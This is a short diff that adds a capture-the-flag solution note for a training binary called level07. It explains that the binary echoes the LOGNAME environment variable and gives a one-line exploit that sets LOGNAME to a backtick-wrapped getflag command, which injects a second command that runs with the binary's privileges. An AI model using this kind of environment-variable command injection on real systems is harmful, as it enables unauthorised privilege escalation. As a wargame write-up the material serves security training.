@@ -1,0 +1,6 @@
+"gdb level07" or "strings level07"
+
+1. Notice that the binary gets the env var LOGNAME, and echoes it
+2. Replace LOGNAME to echo getflag
+
+$ LOGNAME='`getflag`' /home/user/level07/level07
